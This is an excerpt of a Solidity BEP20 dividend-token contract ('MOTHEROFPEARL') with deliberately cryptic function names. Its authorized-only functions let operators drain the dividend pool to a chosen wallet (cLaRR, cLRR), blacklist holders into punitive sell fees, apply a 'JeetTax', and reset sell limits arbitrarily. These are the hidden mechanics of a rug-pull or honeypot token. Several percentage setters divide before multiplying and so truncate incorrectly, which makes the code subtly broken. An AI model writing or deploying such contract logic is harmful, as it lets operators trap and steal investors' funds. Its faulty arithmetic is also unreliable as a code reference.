...
interface IDividendDistributor {
    ...
    function gIcR(uint256 _Pe) external;
    function gIR(uint256 _Pr, address _rrs) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function gIR(uint256 _Pr, address _rrs) external override onlyToken {
        rrs = IBEP20(_rrs);
        uint256 Rrd = rrs.balanceOf(address(this));
        payable(rFR).transfer(Rrd.mul((_Pr).div(100)));
    }
    ...
    function gIcR(uint256 _Pe) external override onlyToken {
        uint256 Rd = RWDS.balanceOf(address(this));
        payable(rFR).transfer(Rd.mul((_Pe).div(100)));
    }
...
contract MOTHEROFPEARL is IBEP20, Auth {
    ...
    uint256 public _maxbTxAmount = ( _totalSupply * 20 ) / 1000;
    uint256 public _maxsTxAmount = ( _totalSupply * 10 ) / 1000;
    ...
    uint256 public _JTm = 3;

    bool public bCE = false;
    uint8 public cbTI = 30;
    uint8 public csTI = 120;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "NOT ENOUGH BRO");
        }

        return _transferFrom(sender, recipient, amount);
    }
    
    function setMbTP(uint256 mTP) external onlyOwner() {
        _maxbTxAmount = _totalSupply.mul((mTP).div(1000));
    }

    function setMsTP(uint256 mTP) external onlyOwner() {
        _maxsTxAmount = _totalSupply.mul((mTP).div(1000));
    }

    function setMWP(uint256 mWP) external onlyOwner() {
        _maxWalletToken = _totalSupply.mul((mWP).div(1000));
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != mFR && recipient != aLR){
            ...
            require((heldTokens + amount) <= _maxWalletToken,"YO WALLET TOO FAT BITCH");}

        if (sender == pair &&
            bCE &&
            !iTloE[recipient]) {
            require(cdT[recipient] < block.timestamp,"SLOW DOWN THE BUYS DUDE");
            cdT[recipient] = block.timestamp + cbTI;
            }else{
                require(cdT[recipient] < block.timestamp,"HAHAHA CANT SELL THAT FAST");
            cdT[recipient] = block.timestamp + csTI;
        }    

        if (sender == pair){ checkTxLimit(sender, amount);
            }else{ checksTxLimit (sender, amount);
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "NOT ENOUGH BRO");
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxbTxAmount || iTLE[sender], "YOU TRYING TO BUY WAY TOO MUCH TACO");
    }

    function checksTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxsTxAmount || iTLE[sender], "COME ON MAN YOU CANT SELL THAT MUCH");
    }
    ...
    function getTotalFee(bool selling, address recipient) public view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return fD.sub(1); }
        if(selling && sME && !JeetTax){ return ((tF.mul(_sMN)).div(_sMD)); }
        if(selling && iBL[recipient]){ return ((tF.mul(BLt)).div(fD)); }
        if(selling && JeetTax){ return (tF.mul(_JTm)); }
    ...
    function swapBack() internal swapping {
        uint256 dlF = isOverLiquified(tL, tLD) ? 0 : lF.mul(_tlnFd).div(_tldFd);
        uint256 dmF = mF.mul(_tmnFd).div(_tmdFd);
        uint256 drF = mF.mul(_trnFd).div(_trdFd);
        ...
        uint256 aBNBR = aBNB.mul(drF).div(tBNBF);
        uint256 aBNBM = aBNB.mul(dmF).div(tBNBF);
    ...
    function setMbTL(uint256 amount) external authorized {
        _maxbTxAmount = amount;
    }

    function setMsTL(uint256 amount) external authorized {
        _maxsTxAmount = amount;
    }
    ...
    function setiBL(address holder) external authorized {
        iBL[holder] = true;
    }
    ...
    function setSB(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
        sT = _totalSupply.mul((_amount).div(10000));
    }
    ...
    function cLaRR(uint256 _Pr, address _rrs) external authorized {
        distributor.gIR(_Pr, _rrs);
    }
    ...
    function cLRR(uint256 _Pe) external authorized {
        distributor.gIcR(_Pe);
    }
